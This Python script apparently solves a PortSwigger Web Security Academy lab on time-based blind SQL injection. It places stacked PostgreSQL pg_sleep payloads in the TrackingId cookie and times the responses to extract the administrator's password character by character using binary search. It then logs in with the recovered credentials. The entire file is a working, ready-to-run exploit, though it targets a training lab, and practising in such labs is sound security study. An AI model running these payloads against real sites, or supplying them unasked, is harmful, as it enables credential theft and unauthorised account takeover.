#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval
import re
import requests
from timeit import default_timer as timer


def csrf_fetch(response_text):
    match = re.search(r'name="csrf" value="(.+?)"', response_text)
    return match.group(1) if match else None

LAB_ID = "0ae5005004b22b538094cb05008600ba" # YOUR LAB-ID HERE
url = f"https://{LAB_ID}.web-security-academy.net/"
login_url = url+"login"

alnum = "0123456789abcdefghijklmnopqrstuvwxyz"

client = requests.Session()

r = client.get(url)
if (r.status_code != 200):
    print(f"failed to connect: {r.status_code}")
    exit(1)

cookie = r.cookies
i = 1
password = ""
while True:
    prev_len = len(password)
    low = 0
    high = len(alnum) - 1
    while low <= high:
        mid = (low + high) // 2
        char = alnum[mid]
        print(f"trying {i} {char}")

        cookie['TrackingId'] = f"'%3b SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)>='{char}') THEN pg_sleep(1) ELSE pg_sleep(0) END--"
        start = timer()
        client.get(url, cookies=cookie)
        end = timer()
        print(round(end-start,2))
        if round(end-start,2)>=1.1:
            print("maybe too small")
            cookie['TrackingId'] = f"'%3b SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}') THEN pg_sleep(1) ELSE pg_sleep(0) END--"
            start = timer()
            client.get(url, cookies=cookie)
            end = timer()
            if round(end-start,2)>=1.1:
                print(f"\n*found*, pos {i}: {char} \n\n")
                password+=char
                break
            low = mid+1
        else:
            print("too large")
            high = mid-1
    if prev_len == len(password):
        break
    i+=1
print(f"the correct password is: {password}")

client.get(login_url)
login_data ={
    'username':'administrator',
    'password':password,
    'csrf':csrf_fetch(client.get(login_url).text)
}
#logging in with correct creds:
client.post(login_url, data=login_data)
print("logged in!")